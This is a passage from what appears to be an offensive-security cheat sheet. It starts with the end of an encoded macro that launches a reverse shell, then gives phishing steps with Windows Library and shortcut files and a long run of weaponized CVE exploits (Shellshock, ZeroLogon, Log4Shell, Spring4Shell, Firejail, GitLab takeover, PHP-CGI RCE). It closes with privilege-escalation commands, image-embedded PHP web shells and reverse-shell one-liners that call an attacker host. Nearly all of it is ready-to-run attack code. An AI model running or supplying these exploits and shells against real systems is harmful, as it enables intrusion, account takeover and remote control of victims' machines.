    Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
    Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
    Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
    Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
    Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
    Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
    Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

#### Microsoft Windows Library Files

##### Installation of wsgidav

```c
pip3 install wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
```

##### config.Library-ms

```c
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<LHOST></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Put the `config.Library-ms` file in the `webdav` folder.

##### Shortcut File

Right-click on Windows to create a new `shortcut file`.

```c
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

Put the `shortcut file (*.lnk)` into the `webdav` folder.

##### Send Phishing Email

```c
swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
```

### CVE

#### CVE-2014-6271: Shellshock RCE PoC

```c
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
```

#### CVE-2016-1531: exim LPE

- exim version <= 4.84-3

```c
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

#### CVE-2019-14287: Sudo Bypass

> https://www.exploit-db.com/exploits/47502

##### Prerequisites

- Sudo version < 1.8.28

##### Exploitation

```c
!root:
sudo -u#-1 /bin/bash
```

#### CVE-2020-1472: ZeroLogon PE

> https://github.com/SecuraBV/CVE-2020-1472

> https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py

##### Prerequisites

```c
python3 -m pip install virtualenv
python3 -m virtualenv venv
source venv/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
```

##### PoC Modification

```c
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
```

##### Weaponized PoC

```c
#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if not rpc_con:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
```

##### Execution

```c
python3 zerologon_tester.py <HANDLE> <RHOST>
impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
```

#### CVE-2021-3156: Sudo / sudoedit LPE

> https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435

##### Prerequisistes

- Ubuntu 20.04 (Sudo 1.8.31)
- Debian 10 (Sudo 1.8.27)
- Fedora 33 (Sudo 1.9.2)
- All legacy versions >= 1.8.2 to 1.8.31p2 and all stable versions >= 1.9.0 to 1.9.5p1

##### Vulnerability Test

```c
sudoedit -s /
```

The machine is vulnerable if one of the following message is shown.

```c
sudoedit: /: not a regular file
segfault
```

Not vulnerable if the error message starts with `usage:`.

#### CVE-2021-44228: Log4Shell RCE (0-day)

> https://github.com/welk1n/JNDI-Injection-Exploit

```c
wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
```

```c
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<COMMAND>"
```

```c
${jndi:ldap://<LHOST>:1389/ci1dfd}
```

##### Alternatively

> https://github.com/kozmer/log4j-shell-poc

###### Prerequisistes

> https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

```c
tar -xvf jdk-8u20-linux-x64.tar.gz
```

###### Start the Listener

```c
python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>                                   
```

###### Execution

```c
${jndi:ldap://<LHOST>:1389/foobar}
```

#### CVE-2022-0847: Dirty Pipe LPE

```c
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 ootz:
su rootz
```

#### CVE-2022-22963: Spring4Shell RCE (0-day)

> https://github.com/me2nuk/CVE-2022-22963

```c
curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
```

```c
curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
```

#### CVE-2022-31214: Firejail LPE

> https://seclists.org/oss-sec/2022/q2/188

> https://www.openwall.com/lists/oss-security/2022/06/08/10

```c
#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner () suse com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper sandbox")
    else:
        raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at {join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```

#### First Terminal

```c
./firejoin_py.bin
You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

#### Second Terminal

```c
firejail --join=193982
su
```

#### CVE-2023-21746: Windows NTLM EoP LocalPotato LPE

> https://github.com/decoder-it/LocalPotato

> https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc

Modify the following file and build the solution.

```c
StorSvc\RpcClient\RpcClient\storsvc_c.c
```

```c
#if defined(_M_AMD64)

//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022
```

Modify the following file and build the solution.

```c
StorSvc\SprintCSP\SprintCSP\main.c
```

```c
void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
```

First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.

```c
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
```

At least trigger `StorSvc` via `RpcClient.exe`.

```c
.\RpcClient.exe
```

#### CVE-2023-22809: Sudo Bypass

> https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466

##### Prerequisites

- Sudo version needs to be ≥ 1.8 and < 1.9.12p2.
- Limited Sudo access to at least one file on the system that requires root access.

##### Example

```c
test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd
```

##### Exploitation

```c
EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
```

```c
sudoedit /etc/motd
```

#### CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)

- Linux ubuntu2204 5.19.0-46-generic

```c
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

#### CVE-2023-4911: Looney Tunables LPE

```c
python3 gen_libc.py 
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```c
gcc -o exp exp.c
./exp
```

#### CVE-2023-7028: GitLab Account Takeover

> https://github.com/V1lu0/CVE-2023-7028

> https://github.com/Vozec/CVE-2023-7028

### PoC

```c
user[email][]=valid@email.com&user[email][]=attacker@email.com
```

### Modified PoC from TryHackMe

```c
import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choice
from time import sleep
import re
requests.packages.urllib3.disable_warnings()

class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        self.use_temp_mail = False
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()

    def get_csrf_token(self):
        try:
            print('[DEBUG] Getting authenticity_token ...')
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text
            regex = r'<meta name="csrf-token" content="(.*?)" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None

    def ask_reset(self):
        token = self.get_csrf_token()
        if not token:
            return False

        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)

        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        print('[DEBUG] Sending reset password request')
        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           data=query_string,
                           headers=head,
                           verify=False).text
        sended = 'If your email address exists in our database' in html
        if sended:
            print(f'[DEBUG] Emails sent to {self.target} and {self.evil} !')
            print(f'Flag value: {bytes.fromhex("6163636f756e745f6861636b2364").decode()}')
        else:
            print('[DEBUG] Failed ... quitting')
        return sended

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')
    parser.add_argument("-u", "--url", dest="url", type=str, required=True, help="Gitlab url")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target email")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    exploit = CVE_2023_7028(
        url=args.url,
        target=args.target,
		evil=args.evil
    )
    if not exploit.ask_reset():
        exit()
```

### Execution

```c
python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
```

#### CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE

```c
"""
PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
Exploit By: Aliz (@AlizTheHax0r) and Sina Kheirkhah (@SinSinology) of watchTowr (@watchtowrcyber) 
Technical details: https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/?github
Reference: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
"""

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  
        watchTowr-vs-php_cve-2024-4577.py
        (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
          - Aliz Hammond, watchTowr (aliz@watchTowr.com)
          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)
        CVEs: [CVE-2024-4577]  """


import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import argparse

print(banner)
print("(^_^) prepare for the Pwnage (^_^)\n")

parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 --target http://192.168.1.1/index.php -c "<?php system('calc')?>""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')


s = requests.Session()
s.verify = False



res = s.post(f"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data=f"{args.code};echo 1337; die;" )
if('1337' in res.text ):
    print('(+) Exploit was successful')
else:
    print('(!) Exploit may have failed')
```

#### GodPotato LPE

> https://github.com/BeichenDream/GodPotato

```c
.\GodPotato-NET4.exe -cmd '<COMMAND>'
```

#### Juicy Potato LPE

> https://github.com/ohpe/juicy-potato

> http://ohpe.it/juicy-potato/CLSID/

##### GetCLSID.ps1

```c
<#
This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
Then exports to CSV
#>

$ErrorActionPreference = "Stop"

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT

Write-Output "Looking for CLSIDs"
$CLSID = @()
Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){
    if ($ID.appid -ne $null){
        $CLSID += $ID
    }
}

Write-Output "Looking for APIDs"
$APPID = @()
Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@{N='AppID'; E={$_.pschildname}})){
    if ($AID.LocalService -ne $null){
        $APPID += $AID
    }
}

Write-Output "Joining CLSIDs and APIDs"
$RESULT = @()
Foreach ($app in $APPID){
    Foreach ($CLS in $CLSID){
        if($CLS.AppId -eq $app.AppID){
            $RESULT += New-Object psobject -Property @{
                AppId    = $app.AppId
                LocalService = $app.LocalService
                CLSID = $CLS.CLSID
            }

            break
        }
    }
}

$RESULT = $RESULT | Sort-Object LocalService

# Preparing to Output
$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace "Microsoft ", ""
$TARGET = $OS -Replace " ","_"

# Make target folder
New-Item -ItemType Directory -Force -Path .\$TARGET

# Output in a CSV
$RESULT | Export-Csv -Path ".\$TARGET\CLSIDs.csv" -Encoding ascii -NoTypeInformation

# Export CLSIDs list
$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath ".\$TARGET\CLSID.list" -Encoding ascii

# Visual Table
$RESULT | ogv
```

##### Execution

```c
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
```

#### JuicyPotatoNG LPE

> https://github.com/antonioCoco/JuicyPotatoNG

```c
.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
```

#### MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE

> https://www.exploit-db.com/exploits/1518

```c
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```c
mysql -u root
```

```c
> use mysql;
> create table foo(line blob);
> insert into foo values(load_file('/PATH/TO/SHARED_OBJECT/raptor_udf2.so'));
> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
> create function do_system returns integer soname 'raptor_udf2.so';
> select do_system('chmod +s /bin/bash');
```

#### PrintSpoofer LPE

> https://github.com/itm4n/PrintSpoofer

```c
.\PrintSpoofer64.exe -i -c powershell
```

#### SharpEfsPotato LPE

> https://github.com/bugch3ck/SharpEfsPotato

```c
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

#### Shocker Container Escape

> https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c

##### Modifying Exploit

```c
        // get a FS reference from something mounted in from outside
        if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
                die("[-] open");

        if (find_handle(fd1, "/root/root.txt", &root_h, &h) <= 0)
                die("[-] Cannot find valid handle!");
```

##### Compiling

```c
gcc shocker.c -o shocker
cc -Wall -std=c99 -O2 shocker.c -static
```

### Payloads

#### Exiftool

##### PHP into JPG Injection

```c
exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' <FILE>.jpeg
exiftool "-comment<=back.php" back.png
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
```

#### Reverse Shells

##### Bash Reverse Shell

```c
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
```

##### curl Reverse Shell

```c
curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '{"auth": {"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"|base64 -d|bash"}'
```

##### Groovy (Jenkins) Reverse Shell

```c
String host="<LHOST>";
int port=<LPORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

##### JAVA Reverse Shell

```c
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

###### shell.jar

```c
package <NAME>;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
